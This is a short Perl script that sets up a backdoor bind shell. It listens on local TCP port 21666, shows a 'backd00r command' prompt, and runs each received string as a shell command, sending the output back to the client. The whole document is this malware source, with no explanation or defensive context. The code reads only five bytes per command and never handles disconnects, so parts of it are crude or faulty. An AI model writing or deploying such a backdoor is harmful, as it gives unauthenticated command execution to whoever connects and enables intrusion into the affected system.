#!/usr/bin/perl

use 5.010;
use strict;
use warnings;
use IO::Socket;

sub main {
  my $socket = IO::Socket::INET -> new (
    LocalHost => '127.0.0.1',
    LocalPort => '21666',
    Proto => 'tcp',
    Listen => 5,
    Reuse => 1
  );

  while(1) {
    my $client = $socket -> accept();
    my $host   = $client -> peerhost();
    my $port   = $client -> peerport();

    while(1) {
      $client -> send("backd00r command:~# ");
      $client -> recv(my $command, 5);
      
      my $cmd = `$command`;
      $client -> send($cmd);
    }
  }
}

main();
exit;
